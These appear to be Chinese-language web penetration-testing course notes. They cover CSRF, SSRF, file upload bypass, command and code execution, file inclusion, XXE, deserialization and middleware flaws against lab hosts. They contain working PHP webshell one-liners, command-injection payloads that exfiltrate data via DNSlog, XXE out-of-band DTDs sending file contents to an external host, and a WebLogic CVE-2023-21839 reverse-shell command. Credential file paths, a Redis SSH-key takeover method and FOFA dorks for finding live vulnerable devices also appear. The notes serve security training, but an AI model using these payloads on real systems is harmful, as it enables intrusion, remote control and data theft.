	同源策略(Same Origin Policy, SOP)是Web应用程序的一种安全模型，它控制了网页中DOM之间的访问。重要的事情说三遍，它只是个模型，而不是标准（哪怕标准在实现的时候也会千差万别）。同源策略被广泛地应用在处理WEB内容的各种客户端上，比如各大浏览器，微软的Silverlight，Adobe的Flash/Acrobat等等。SOP影响范围包括：普通的HTTP请求、XMLHttpRequest、XSLT、XBL。
# 172.168.20.40:8006

~~~



<>过滤，使用事件

# 五、CSRF-SSRF

## CSRF

（Cross-site request forgery，跨站请求伪造）攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己以前认证过的站点并运行一些操作（如发邮件，发消息，甚至财产操作（如转账和购买商品））。因为浏览器之前认证过，所以被访问的站点会认为这是真正的用户操作而去运行。

区别：用户自己操作

python搭建网站：phyhon -m http 8080

~~~shell
#探测方法
1、工具
2、手动：删掉referer如果还可以用就有漏洞（没有验证来源）
#攻击流程
1、用户先登录并没有关闭页面
2、攻击者抓自己数据包，并在extension用工具生成恶意网页（CSRF scanner）
3、访问到了恶意链接
4、用户提交的是恶意链接而不是自己的页面
# 原理
攻击者使用用户的权限登录
# 防御
1、重要操作需要验证身份
2、网页来源要过滤
3、随机token
4、随机验证码

#老的浏览器恶意网页可修改名字成服务器ip，可验证成功
###练习
钓鱼网站
表单提交
xss语言-->xss lab靶场8关
伪静态地址
# 课堂练习
http://172.168.20.40:8005/vul/csrf/csrfget/csrf_get.php
172.168.20.40:8201/admin/
# genator
8005
~~~



## SSRF（更加危险）

（server-Side Request Forgery，服务端请求伪造）是指一种由攻击者构造形成由服务端发起请求的一个安全漏洞，一般情况下，SSRF攻击的目标都是从外网无法访问的内部系统，借助服务端发起伪造的请求，可以访问到与它相连而与外网隔离的内部系统。

目标：从外网无法访问的内部系统

~~~shell

# 思路
1、从web功能上寻找
	分享
	转码
	翻译
	图片、文章收藏功能/下载图片
	未公开的api实现
2、从url关键字中寻找
	url
	src
	domain
# 利用
1、利用http加载其它东西：（端口探测：burp8000-10000）
	172.168.20.2：8080（可以让8080作为变量，也可以使用2作为变量）
	url=http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info1.php
2、file命令读取文件：
	file=file:///C:/phpStudy/WWW/shell.txt
3、ftp
	url=ftp://pwd
4、dirt
	url=dirt://IP:port/info
5、gopher
	gopher://ip:port/_TCP/IP数据
	* 末尾使用%0%0a
# dict协议：
词典网络协议，允许客户端在使用过程中访问更多字典。Dict服务器和客户机使用TCP端口2628。
# gopher协议：
Gopher是Internet上一个非常有名的信息查找系统。
# ssrf绕过 http://127.0.0.1 http://localhost
1、加上端口
2、短网址
3、转换成其它进制
4、用@127.0.0.1
# 防御
1、过滤返回的信息
2、统一错误信息，避免根据错误信息来判断
3、限制请求的端口，比如80、443、8080、8090
4、禁止不常用的协议
5、使用DNS缓存或者Host白名单方式
# 课堂练习
为什么不能用sqlmap？而是burp扫端口
http://ctf15.root-me.org/
http://172.168.20.40:8005/vul/ssrf/ssrf_curl.php?url=
# ctf靶场
靶场：https://www.root-me.org
~~~



# 六、文件上传

文件上传绕过的方法

~~~shell
# 绕过的办法
前端：
	1、修改文件名
	2、修改content-type
后端：
	1、上传配置文件：httpd.conf、.htaccess、.user.ini
	2、文件上传路径：%00
	3、文件后缀名：
		* ::$DATA(放在文件名后用来绕过黑名单，解析的时候会删掉,如 1.php::$DATA)
		* XXX(放在文件名后用来绕过黑名单，解析的时候会忽略。如1.php.xxx)
	3、木马和图片打包(会读取图像前端数据)：使用文件包含漏洞，先运行include.php(在网站访问，再访问图片就以php运行)
	4、竞争机制：竞争：先保存，再判断，再删除
	使用burp-->intruter-->不停的发数据包
	::$DATA
	5、中间件解析漏洞
# 打开软件的方法
本地cmd
~~~



文件配置

~~~shell
# 1、.htaccess（网站目录下）
<FilesMatch "1.jpg">
SetHandler application/x-httpd-php
</FilesMatch>
# 2、.user.ini
auto_prepend_file=1.jpg
* auto_prepend_file 指定一个文件，自动包含在要执行的文件后
* auto_append_file=1.jpg 指定一个文件，自动包含在要执行的文件前
# 4、 1.php.xxx
# 5、漏洞：php小于5.3-->%00（零零截断）
	get才行，post需要自己编码(在burp里面转换‘口’)
# 6、一句话木马
<?php @eval($_POST[11]);?>
@：关闭所有通知
eval：当成php执行
# 7、php3解析为php，在phpTutorial/apache/conf/httpd.conf
AddType application/x-httpd-php .php .php3 .php5 .pht .phtml（404）
# 8、打包
	copy result.png/b+1.php/a abc.png
	(result.png 和 1.php；b指的是binary，a指的是追加>>	）
# phpinfo
~~~

软件下载

~~~shell
# 软件
1、antsword(蚁剑)：明文
2、冰蝎（behind）：密文、不能自己写，要软件生成（加解密有key才可以加解密）
3、Godzilla：打包网站
4、做木马GPT
5、ONE-FOX集成工具箱_V3.0魔改版_by狐狸
百度网盘下载地址：https://pan.baidu.com/s/1JEtT2S9bjstuOeLqCx1ofQ?pwd=ofox
后续加入github项目地址
6、dama、gel4y（github）
######
内网穿透
~~~

# 七、代码执行、命令执行、中间件

## 1、代码执行（概率低）

动态代码执行函数过滤参数不严格，导致用户输入数据作为服务端代码执行。

危害：执行脚本代码

~~~shell
# 产生：
看功能点
1、web源码，一些常见的cms
2、中间件漏洞（框架）

# 相关函数造成代码执行:eval()函数，assert()函数，preg_replace()，create_function()，call_user_func()，
call_user_func_array()等
1、eval(),assert() ：把字符串当php来执行
	/eval.php?cmd=system(whoami);
	/eval.php?cmd=phpinfo();
2、preg_replace：/e修饰符当作php代码执行
	/preg.php?cmd=phpinfo();
# 动态函数调用:在PHP中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数。在PHP语言中，可以通过动态函数调用来对代码进行执行。
	/function.php?cmd=phpinfo
# 回调函数call_user_func：第一个参数是callback，是被调用的回调函数，其余后面的参数是回调函数的参数
	call_user_func.php?call=system&cmd=whoami

~~~

函数的使用

~~~shell
# eval函数
<?php
$a = $_GET['cmd'];
eval($a);
?>
# preg_replace函数
<?php
echo preg_replace("/hello/e",$_GET["cmd"],"helloworld");
?>//将hello用cmd替换
一般：preg_replace($pattern, $replacement, $string);//string里面的pattern替换成replacement
# 动态函数调用
<?php
function A(){
return "..A..";
}
function B(){
return "..B..";
}
$fun = $_REQUEST['cmd'];
echo $fun();//动态调用函数
?>
#request参数是post和get都可以
# 回调函数：call_user_func
<?php call_user_func($_REQUEST['call'],$_REQUEST['cmd']);?>
#练习
http://172.168.20.40:8118/mdmsfv/#
admin/admin
~~~



## 2、命令执行

应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。

~~~shell
# 常用执行命令
1、system函数：用来执行一个外部的应用程序并将相应的执行结果输出
2、Passthru函数：函数可以用来执行一个UNIX系统命令并显示原始的输出
3、Exec函数：用来执行一个外部的应用程序
4、Eval函数：函数会将参数字符串作为PHP程序代码来执行，将php代码保存成字符串的形式然后传递给eval函数执行。
# 一、system函数
<?php
$cmd = $_GET['cmd'];
system($cmd);
//cmd=whoami
?>
# 1、windows
| 直接执行后面的语句 ping 127.0.0.1 | whoami
|| 前面语句为假，执行后面的 ，前面为假 ping 2 || whoami
& 前面语句为假则直接执行后面的,前面可真可假 ping 127.0.0.1&whoami
&& 前面的语句为假则直接出错，后面的也不执行，前面只能为真 ping 127.0.0.1&&whoami
# 2、linux
; 前面的执行完执行后面的 ping 127.0.0.1;whoami
| 管道符，显示后面的执行结果 ping 127.0.0.1|whoami
|| 当前面的执行出错时执行后面的 ping 1||whoami
& 前面的语句为假则直接执行后面的,前面可真可假 ping 127.0.0.1&whoami
&& 前面的语句为假则直接出错，后面的也不执行，前面只能为真 ping 127.0.0.1&&whoami
# shell_exec函数
<?php
highlight_file(__FILE__);//显示代码
$ip = $_GET['ip'];
$addr = shell_exec('ping '.$ip);
//echo '<pre>'.$addr.'</pre>';
?>
# payload
http://xx.xx.xx.xx/shell_exec.php?ip=12|ping %USERNAME%.znbth5.dnslog.cn
# 资料
https://blog.csdn.net/zhangge3663/article/details/117413265
# 若无回显
1、wpxi8b,dnslog.cn
	%USERNAME%.wpxi8b.dnslog.cn
	linux：ping 'id'.wpdj.dnslog.cn
2、ip=123|echo '111' > aaa.txt
3、反弹shell
#
strut2 漏洞 
~~~



## 3、中间件，框架代码执行

* 代码审计
* 漏扫工具
* 公开漏洞
* 网站功能点

~~~shell
漏洞：比如s2里面默认网页下面有.action 文件
# 命令：
python s2_061.py --url http://172.168.20.139:8080/ --cmd ls
python s2_061.py --url http://172.168.20.139:8080/ --cmd id
python s2_061.py --url http://172.168.20.139:8080/
安装功能：pip3 install module

# 怎么拿shell
1、直接带反弹语句
2、写在文件里：写、看、给权限、执行
3、下载文件
~~~



# 八、文件包含

## 1、本地文件包含

程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这种文件调用的过程一般被称为文件包含。

~~~shell
#首先要有传参（输入）的地方
# 有以下四种函数
 require()：只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本
 require_once()
 include()：执行到include时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行 
 include_once()
 # once避免重复包含
# 利用条件
1、allow_url_fopen 和 allow_url_include 要为on
2、程序用include()等文件包含函数通过动态变量的范式引入需要包含的文件
3、用户要能够控制该动态变量
//打开方法phpstudy “其他选项菜单”---> “参数开关设置”
# 利用
1、本地文件包含：
	（1）包含日志文件Getshell
	（2）读取敏感文件（apache-->conf因为执行不了所以直接输出）
			page=../../apache/conf/httpd.conf (../是上层目录)
	（3）配合上传图片木马，然后包含从而getshell
	（4）包含data:或php://input等伪协议
	（5）若有phpinfo则可以包含临时文件
2、远程文件包含
	page=http://www.baidu.com
# 绕过限制：
1、零零截断：版本小于5.3.4;magic_quotes_gpc=off
2、溢出：超过256会丢弃（低版本）
	......*n
	././././
# php代码
<?php
if ($_GET[page]){
include $_GET[page];
}
else {
include "home.php";
}
?>
# 带文件后缀的文件包含
<?php
$filename=$_GET['page'];
include($filename);【or include($filename.".html");】
?>//没有严格过滤参数page
~~~



## 2、文件包含php封装协议

​	封装是php面向对象的其中一个特性，将多个可重复使用的函数封装到一个类里面。在使用时直接实例化该类的某一个方法，获得需要的数据。
​	PHP 带有很多内置 URL 风格的封装协议，可用于类似fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数。除了这些封装协议，还能通过 stream_wrapper_register() 来注册自定义的封装协议。

~~~shell
# Windows：
c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件
c:\windows\repair\sam // 存储Windows系统初次安装的密码
c:\ProgramFiles\mysql\my,ini // MySQL配置
c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root
c:\windows\php.ini // php 配置信息 c:\windows\my.ini

# Linux：
/etc/passwd // 账户信息
/etc/shadow // 账户密码文件
/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件
/etc/httpd/conf/httpd.conf
/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置
/usr/local/app/php5/lib/php.ini // PHP相关配置
/etc/my.conf // mysql 配置文件
~~~



开启包含功能的条件：（php.ini）

* allow_url_fopen:on
* allow_url_include:on

### 文件协议

~~~shell
# 协议：
#1、php://协议：
  * php://stdin 只读协议
  * php://stderr 只写协议
#2、php://input协议：把整个文件读入一个字符串中。
  * <?php
    echo file_get_contents("php://input");
    ?>
  * http://172.168.70.226/web/baohan/phpinut.php
  * 抓包，改包
php://input只能够获取POST参数中的数据,而真正能够创建文件和把数据写入文件的函数是fopen()函数和fputs()函数
#3、fopen()函数
	* fopen()函数是用来打开文件后者是URL，如果打开失败的话，本函数返回FALSE
	语法：fopen(filename,mode,include_path,context)-->
		fopen(“abc.php”,”w”)//以写入的方式打开一个“ak.txt”文件，如果没有此文件便创建一个
#4、fputs()函数
fputs()函数的作用是写入文件（可安全的用于二进制文件），它是fwrite()函数的别名
1、语法：
	* <?php
		$file = fopen("shell.php","w");
		echo fputs($file,"Hello world!!!");
		fclose($file);
		?>
* 这段代码的意思就是令fopen函数建立的shell.php文件传递给变量file，然后利用fputs函数把Hello world!!!写入到shell.php中。
2、链接：http://172.168.70.226/web/baohan/index.php?page=php://input
抓包写入：<?fputs(fopen('any1.txt','w'),'hello any');?>;
3、一句话木马：
<?php fputs(fopen("shell.php","w"),"<?php @eval($_POST[1]);?>");?>
4、问题：post被过滤
@eval(\$_POST[1])
#5、php://filter
* 最常用的一个伪协议，一般用来进行任意文件读取
* 一般把php://filter协议用来读取网站的源码，或者一些隐藏的东西，作为base64编码的格式全部展现，然后再对它进行解码，就可以得到我们想要的东西。
1、用法：
?filename=php://filter/convert.base64-encode/resource=xxx.php
2、使用条件：
只是读取，需要开启 allow_url_fopen，不需要开启 allow_url_include；
3、案例：
http://172.168.70.226/web/baohan/index.php?page=php://filter/read=convert.base64-encode/resource=shell.php
解密后：<?php @eval($_POST[1]);?>
#6、file://伪协议
1、案例：
http://172.168.70.226/web/baohan/index.php?
page=file:///E:\phpStudy\PHPTutorial\WWW\web\baohan\phpinfo.php
#7、data://伪协议
数据流封装器，和php://相似都是利用流的概念，将原本的include的文件流重新定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含来你的输入流，通过你输入payload来实现目的。
1、例子：
http://172.168.70.226/web/baohan/index.php?page=data://text/plain;base64,aGVsbG8gd29ybGQ=
#8、phar，zip（5.3~5.4）
1、phar伪协议: php版本：php>5.3
* phar://伪协议是php解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压。
2、zip伪协议: php版本：5.3<php<5.4
* zip://伪协议；zip伪协议与phar协议类似，但用法不同
3、包含顺序
(1)?page=zip:uploads/aa.zip%23aa
(2)?page=phar://./uploads/aa.zip/aa.php
~~~

upload.php文件

~~~php
<?php
$uploaddir = 'uploads/';
if (isset($_POST['submit'])) {
if (file_exists($uploaddir)){
$allow_ext = array('.zip');
$file_ext = strrchr($_FILES['upfile']['name'], '.');
if (in_array($file_ext, $allow_ext)){
if (move_uploaded_file($_FILES['upfile']['tmp_name'], $uploaddir
. '/' . $_FILES['upfile']['name'])){
echo '文件上传成功，保存路径：' . $uploaddir . $_FILES['upfile']
['name'] . "\n";
}
}else {
echo '此文件不允许上传' . "\n";
}
}else{
exit($uploaddir . '文件夹不存在，请手工创建！');
}
}
?>
<html>
<head>
<meta charset="utf-8">
<title>文件上传zip,phar验证实例</title>
<h3>文件上传zip,phar验证实例</h3>
<form action="upload.php"method="post" enctype="multipart/form-data"
name="upload">
请选择要上传的文件: <input type="file" name="upfile" />
<input type="submit" name="submit" value="上传" /></form>
<body>
</body>
</html>
~~~

up.php文件

~~~php
<?php
$filename=$_GET['page'];
include($filename. '.php');
?>
~~~

## 3、文件包含日志文件

Apche日志文件：

安装并启动apache后，apache会自动生成两个日志文件，这两个日志文件分别是访问日志
access.log和错误日志error_log（在windows上是access.log和error.log）

* access.log：访问日志
* error.log：错误日志

案例：

1、ssh用户名抓包用自己的电脑进行访问抓包，修改格式，因为不知道密码，会生成erro.log，用php文件包含访问，会运行木马

## 4、远程文件包含

* 如果PHP的配置选项allow_url_include为ON的话，则include/require函数可以加载远程文件，这种
  漏洞被称为"远程文件包含漏洞(Remote File Inclusion RFI)"。
* allow_url_fopen = On 是否允许打开远程文件
* allow_url_include = On 是否允许include/require远程文件

注意：如果是包含远程服务器上的PHP文件，那么得到的是被远程服务器解析过的PHP，所以在写一句
话木马的时候就不要做成.php的文件，一般做成.txt的文件，再让它包含过来



# 九、XXE-外部实体注入漏洞

​		xml全称"可扩展标记语言"(extensible markup language),XML是一种用于存储和传输数据的语言。与HTML一样，XML使用标签和数据的树状结构。但不同的是，XML不使用预定义标记，因此可以为标记指定描述数据的名称。XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。

~~~shell
#三部分
1、xml声明
<?xml version=""?>
2、文档类型定义 or 引用外部(DTD)
<!DOCTYPE 根元素 []>
	<!ELEMENT ...note/to/from/heading (#PCADA)>
3、文档元素
<note>
<to></to>
<from></from>
# xxe漏洞：
XML External Entity即外部实体，从安全角度理解成XML Enternal Entity attack 外部实体注入攻击。解析了攻击者的外部实体，会造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等。
# xxe的危害
1、读取任意文件
2、执行系统命令
3、探测内网端口
4、攻击内网网站
# 支持协议：
libxml2：file、http、ftp
PHP：file、http、ftp、php、compress.zlib、compress.bzip2、data、glob、phar
Java：http、https、ftp、file、jar、netdoc、mailto、gopher
.NET：file、http、https、ftp
# 无回显
一、开启服务
1、systemctl start apache2 开启apache服务
2、tail -f /var/log/apache2/access.log 开启日志记录
or
1、python -m http.server 7777
# 判断是否可以用xml
# 一、黑盒
1、content-type：application/xml
2、看数据提交格式： <user><username>admin</username><password>111</password></user>
3、看到：Content-Type: application/x-www-form-urlencoded
	改成：Content-Type: application/xml 或者 text/xml
4、工具：AWVS、Xray等
# 二、白盒
1、看代码
# 绕过
1、协议绕过：data、filter、file
2、空格
3、编码：编码绕过(UTF-7)：https://blog.csdn.net/weixin_43749601/article/details/115330101
4、工具
5、fuzz测试（模糊测试）
# 防御
1、禁止外部实体
文件：doLogin.php--> libxml_disable_entity_loader(true)
2、system等关键字
~~~

代码：

~~~shell
# 读取文件
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY aaa SYSTEM "file:///C:/Windows/win.ini" >]>
<name>&aaa;</name>

#利用base64编码读取php文件
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=file:///D:/phpStudy/PHPTutorial/WWW/pikachu/vul/xxe/11.txt">]>
<name>&xxe;</name>

# 内网探测攻击
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "http://127.0.0.1">]>
<name>&xxe;</name>
# 一、有回显
# 引入外部实体DTD
# eval.dtd:
<!ENTITY send SYSTEM "file:///C:/windows/win.ini">
# payload
<?xml version="1.0"?>
<!DOCTYPE test[
<!ENTITY % dtd SYSTEM "http://172.168.20.84:7777/123.dtd">
%dtd;
]>
<name>&send;</name>
# %dtd指的是要执行上面一句话

# 二、无回显
# 1、加载外部dtd
1、xxx.dtd
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=C:/windows/win.ini">
<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://172.168.20.84:7777/?abc=%file;'>"> %payload;
2、payload
<?xml version="1.0"?>
<!DOCTYPE test[
<!ENTITY % dtd SYSTEM "http://172.168.20.84:7777/123.dtd">
%dtd;
%send;
]>
# 2、加载外部xml
1、xxx.xml
<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://192.168.43.117/?
abc=%file;'>"> %payload;
#######
xxe-lab:http://172.168.20.40:8007/php_xxe/
http://172.168.20.40:8108/
http://172.168.20.71/

~~~



# 十、反序列化

​		未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程。当进行反序列化的时候可能会触发一些对象中的某些魔术方法。

* 反序列化：将字符串或数组转化成对象
* 序列化：讲对象转换成字符串或数组

~~~shell
#序列化和反序列化的好处
		序列化是将变量转换为可保存或传输的字符串的过程；反序列化就是在适当的时候把这个字符串再转化成原来的变量使用。这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。
# demo1
<?php
$a="abcd"; //字符串
$arr = array('j' => 'jack' ,'r' => 'rose'); //数组
class A{
public $test="yeah";
}
echo "序列化:";
echo "</br>";
$aa=serialize($a);
print_r($aa);
echo "</br>";
$arr_a=serialize($arr);
print_r($arr_a);
echo "</br>";
$class1 = new A(); //对象
$class_a=serialize($class1);
print_r($class_a);
//echo "<br/>";
//echo "反序列化:";
//echo "<br/>";
//print_r(unserialize($aa));
//echo "</br>";
//print_r(unserialize($arr_a));
//echo "</br>";
//print_r(unserialize($class_a));
?>
~~~

常用魔术方法

~~~shell
以两个下划线开头的函数称为魔术方法
###
用echo xss漏洞
用eval php写
# __wakeup()
<?php
class A{
var $a = "demo";
function __wakeup(){
echo $this->test;
//eval($this->test);
}
}
$b = new A();
$c = serialize($b);
echo $c;
// O:1:"A":1:{s:1:"a";s:4:"demo";}
//$a = $_GET['a'];
//$a_unser = unserialize($a);
?>
~~~

反序列化魔术方法

~~~shell
# 反序列化魔术方法
__construct() 当一个对象创建时被调用，
__destruct() 当一个对象销毁时被调用，
__toString() 当一个对象被当作一个字符串被调用。
__wakeup() 使用unserialize时触发
__sleep() 使用serialize时触发
__destruct() 对象被销毁时触发
__call() 在对象上下文中调用不可访问的方法时触发
__callStatic() 在静态上下文中调用不可访问的方法时触发
__get() 用于从不可访问的属性读取数据
__set() 用于将数据写入不可访问的属性
__isset() 在不可访问的属性上调用isset()或empty()触发
__unset() 在不可访问的属性上使用unset()时触发
__toString() 把类当作字符串使用时触发,返回值需要为字符串
__invoke() 当脚本尝试将对象调用为函数时触发

# 在线php运行
### java、php、python、
eval

#172.168.20.250 登录页面

~~~



# 十一、逻辑漏洞、文件删除

## 1、越权漏洞

* 垂直越权：abc对admin的信息进行增删改查等
* 水平越权：abc对bcd的信息进行增删改查



## 2、未授权访问（不用登录）

~~~shell
# 一、组件类的，如redis未授权、mongodb未授权等，也是比较常⻅的。对于此类漏洞，可以理解为未授权访问不需要登录即可执行里面的功能，所以存在未授权漏洞
# 二、WEB层面的，如某某CMS未授权文件上传、未授权创建账号等。因为可以绕过登录限制进行操作，所以存在未授权访问漏洞。
	没有对权限进行限制，限制不严格，脆弱性验证
1、xhcms：后台登陆，弱的cookie验证
2、E-message 越权访问漏洞
fofa搜索：title="emessage 设置: 数据库设置 - 标准连接"
fofa:app="Finetree-5MP-Network-Camera"
可访问如下链接添加用户：/quicksetup/user_pop.php?method=add
3、未授权访问

# 设置-->about:config-->javascript
~~~



~~~shell
# redis-cli -h IP（访问开启了6379端口，用此服务访问IP）
# JS文件api接口
# redis:172.168.20.169
web:
	https://www.pension-specialists.com/epdigest/
	https://cyberini.com/admin/mission%20passwords/
	api接口未授权访问
# Redis 未授权访问漏洞
未开启认证，导致可以直接连接到数据库，
然后在攻击机中生成ssh公钥和私钥，密码设置为空，
然后将生成的公钥写入，再利用私钥连接。
# JBOSS 未授权访问漏洞
访问ip/jmx-console 就可以浏览 jboss 的部署管理的信
息面板，不需要输入用户名和密码可以直接部署上传
木马。
简单来说就是对某些页面的验证不严格导致绕过了用
户验证的环节，使其可以直接访问到某些登录后才能
访问到的页面。
~~~



## 3、支付漏洞

~~~shell
1、物品数量正数、负数、总价为0
# 登录需要邮箱，在js里面找一找
~~~

## 4、URL重定向

URL 跳转漏洞是指后台服务器在告知浏览器跳转时，未对客户端传入的重定向地址进行合法性校验，导致用户浏览器跳转到钓⻥⻚面的一种漏洞

~~~shell
pikachu靶场
http://192.168.43.146:85/vul/urlredirect/urlredirect.php?url=http://www.baidu.com
# 攻击方式
构造和目标网站相同的钓⻥网站，让用户点击跳转链接：
# 防御：
传入的URL 做有效性的认证，保证该URL 来自于正确的地方（添加referer限制，添加token验证
# AWXS下载
# Xray

#
1、怎么拿源代码
2、伪静态
3、怎么判断sql、xss
4、怎么找的代码
~~~

## 任意文件下载、删除、读取

~~~shell
1、先找到路径
	功能点：删除、上传、下载等、
2、删除网站安装完成的文件：config.inc.php
	重新安装：站库分离（如果需要数据库名字、密码）
	# 路径 ../temp/../
	# 地址：ssrf任意文件读取
			file://c:windows/ini.php
~~~

~~~shell
gn
任意文件下载：
    http://172.168.20.40:8110/
    payload:
    http://172.168.20.40:8110//index.php/bbs/index/download?url=c:/windows/win.ini&name=&local=1

任意文件删除：
    http://172.168.20.40:8111/
    后台删除处

任意文件读取：
    172.168.20.52 后台编辑模板处 admin/Admin@666
    http://172.168.20.40:8109/
    payload:
    http://172.168.20.40:8109/include/thumb.php?dir=http\..\..\config\config_db.php
    抓包查看

练习：找任意文件删除，读取这些漏洞
    http://172.168.20.40:8118/mdmsfv/#

~~~



# 十二、漏洞

## 中间件漏洞

~~~shell
# 支持的方式
	option /HTTP 1.1
#漏洞浮现 
vulhub.org
vulfocus.cn
#docker 
crlf
~~~



### 1、IIS漏洞

~~~shell
# IIS
# 一、IIS 5.x/6.0 解析漏洞
1、目录解析：在网站下建立文件夹的名称中带有.asp、.asa 等可执行脚本文件后缀的文件夹，其目录内的任何扩展名的文件都被 IIS 当作可执行文件来解析并执行。
http://www.xxx.com/xx.asp/xx.jpg
2、文件解析：在 IIS6.0 下，分号后面的不被解析，也就是说 6.0 下，分号后面的不被解析，也就是说 xx.asp;.jpg 将被当做 xx.asp 解析并执行。
http://www.xxx.com/xx.asp;.jpg
IIS6.0 默认的可执行文件有 asp、asa、cer、cdx 四种。
3、put上传漏洞
	(1)PUT /aa.txt-->最后一行写木马
	(2)通过move或copy重命名：
			COPY /a.txt HTTP 1.1
			Destination:http://www.xxx.com/cmd.asp     //将a.txt重命名为cmd.asp(由于解析漏洞)
# 二、 IIS 7.0/IIS 7.5/ Nginx < 0.8.3 畸形解析漏洞
在默认 Fast-CGI 开启状况下，访问以下网址，服务器将把 xx.jpg 文件当做 php 解析并执行。
http://www.xxx.com/xx.jpg/1.php
# 三、短文件漏洞：123456~1 
	6.0:CVE-2017-7269
资料：https://blog.csdn.net/lzz710107110/article/details/120947836
~~~

### 2、Apache

~~~shell
# Apache 解析漏洞
Apache 对文件解析是从右到左开始判断解析，如果文件的后缀为不可识别，就再往左判断，解析。 如 xx.php.owf.rar，由于 Apache 无法解析 rar 和 owf 后缀，但能够解析 php 后缀，因此 Apache 会将 xx.php.owf.rar 当做 php 格式的文件进行解析并执行。
访问以下网址，服务器将把 xx.php.owf.rar 文件当做 php 解析并执行。
http://www.xxx.com/xx.php.owf.rar
1、CVE-2021-41773：前提：Apache 2.2.49版本
Apache HTTP Server 2.4.49、2.4.50版本对路径规范化所做的更改中存在一个路径穿越漏洞，攻击者可利用该漏洞读取到Web目录外的其他文件，如系统配置文件、网站源码等，甚至在特定情况下，攻击者可构造恶意请求执行命令控制服务器。
2、cve_2021_42013：前提：Apache 2.2.50版本
Apache HTTP Server 2.4.50 中针对 CVE-2021-41773 的修复不够充分。攻击者可以使用路径遍历攻击将 URL 映射到由类似别名的指令配置的目录之外的文件。如果这些目录之外的文件不受通常的默认配置“要求全部拒绝”的保护，则这些请求可能会成功。如果还为这些别名路径启用了 CGI 脚本，则这可能允许远程代码执行。
# 什么是rce（远程代码执行）
RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。rce简单来说就是远程命令执行漏洞。
产生RCE漏洞的根本原因在于，服务器像php环境版本对可执行变量函数没有做过滤，导致在没有自定义相对路径的情况下就运行命令去执行,从而导致服务器被入侵。或者在Web应用中开发者为了灵活性，简洁性等会让应用调用代码或者系统命令执行函数去处理,同时没有考虑用户的输入是否可以被控制，造成代码/系统命令执行漏洞。
~~~

### 3、Nginx

~~~shell
# 1、解析漏洞
/abc.png/.php
# 2、文件名逻辑漏洞 Nginx < 8.03 空字节代码执行漏洞
影响范围：Nginx0.5.,0.6., 0.7 <= 0.7.65, 0.8 <= 0.8.37
（1）访问以下网址，服务器将把 xx.jpg 文件当做 php 解析并执行。
http://www.xxx.com/xx.jpg%00.php
# 3、 CVE-2013-4547 Nginx 解析漏洞
（1）访问以下网址，服务器将把 xx.jpg 文件当做 php 解析并执行。
http://www.xxx.com/xx.jpg（非编码空格）0.php
（2）上传一个"1.gif " 文件，1.gif空格
访问uploadfiles/1.gif[0x20][0x00].php
# 4、使用.htaccess 将任意文件作为可执行脚本解析
	如果在 Apache 中.htaccess 可被执行。且可被上传。那可以尝试在.htaccess 中写入:
<FilesMatch ".(jpg)$"> SetHandler application/x-httpd-php </FilesMatch>
这将把目录下的所有后缀为 jpg 的文件当做可执行的 php 脚本进行解析并执行。


# 用docker复现
1、开启docker：docker-compose up -d
						 docker ps
2、拉取镜像
3、关闭docker：docker-compose down
#网站：wechat.doonsec.com
iis:
  iis6.0解析漏洞，看一下不同就行
  172.168.20.203/a.jpg
  172.168.20.203/a.asp/a.jpg
  172.168.20.203/a.asp;.a.jpg
~~~



### 4、tomcat

~~~shell
#1、弱口令
#2、put文件上传
##########################
gn
练习：
    tomcat弱口令，tomcat-put任意文件上传，tomcat-文件包含
weblogic
2023-21839
漏洞地址：
    http://172.168.20.139:7001
工具下载地址： 
    https://github.com/4ra1n/CVE-2023-21839
    https://github.com/WhiteHSBG/JNDIExploit
使用jndi工具
    java -jar JNDIExploit-1.4-SNAPSHOT.jar  -i 172.168.20.12 -l 1389 -p 9999
payload:
    反弹shell
    CVE-2023-21839.exe -ip 192.168.31.9 -port 7001 -ldap ldap://172.168.20.12:1389/Basic/ReverseShell/192.168.31.149/7777
    执行命令
    CVE-2023-21839.exe -ip 192.168.31.9 -port 7001 -ldap ldap://172.168.20.12:1389/Basic/Command/id

~~~



## 框架漏洞

先找到用的是什么框架，再用相应的软件

可以使用github

~~~shell
# spring boot（java）
# spring框架（小绿叶子）java
1.Spring Security OAuth2 远程命令执行（CVE-2016-4977）
Spring Security OAuth2是为Spring框架提供安全认证支持的一个模块。Spring Security OAuth2处理认证请求的时候如果使用了whitelabel views，response_type参数值会被当做Spring SpEL来执行，攻击者可以在被授权的情况下通过构造response_type值也就是通过构造恶意SpEL表达式可以触发远程代码执行漏洞。故是在需要知道账号密码的前提下才可以利用该漏洞。
# struts2框架
